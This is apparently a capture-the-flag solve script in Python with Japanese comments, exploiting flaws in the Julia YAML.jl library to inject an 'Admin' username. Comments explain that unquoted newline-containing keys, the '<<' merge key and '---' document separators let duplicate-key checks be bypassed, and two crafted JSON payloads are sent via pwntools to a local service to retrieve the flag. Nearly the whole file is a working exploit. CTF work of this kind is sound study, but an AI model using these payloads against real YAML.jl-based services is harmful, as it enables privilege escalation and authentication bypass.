import os
from pwn import remote
import json

HOST = os.getenv("HOST", "localhost")
PORT = int(os.getenv("PORT", "1337"))

# 考え方:
# YAML.jlのキー出力する時に、クォートで囲う必要があるかどうかの判定に改行が含まれていない
# したがって、キーに改行がある場合、そのまま出力されて、parse時には無視されるようになる
# あとは、重複するキーがエラーにならないようにできれば良い。
# 参考: https://github.com/JuliaData/YAML.jl/blob/f43e80285d127f1a02d4508e4ba6858534c45575/src/writer.jl#L103


# 1. <<を利用したflatteningが行われる場合、strict_unique_keysによるチェックを行わない。
# これは、実際にそれが<<でマージされるオブジェクトのキーであるかをチェックしていない
# 参考: https://github.com/JuliaData/YAML.jl/blob/f43e80285d127f1a02d4508e4ba6858534c45575/src/constructor.jl#L205

r = remote(HOST, PORT)
r.sendlineafter(b"JSON:\n", br'{"\n<<": {"x": "y"}, "\nusername\r": "Admin"}')
print(json.loads(r.recvline())["flag"])
r.close()

# 2. YAMLは、---を利用して複数のドキュメントを記述できるが、YAML.loadはそのうちの最初のものしかパースしない。
# (複数のドキュメントをパースするには、YAML.load_allを利用する)

r = remote(HOST, PORT)
r.sendlineafter(b"JSON:\n", br'{"\n\n---\nusername": "Admin", "\n\n---\nx": "a"}')
print(json.loads(r.recvline())["flag"])
r.close()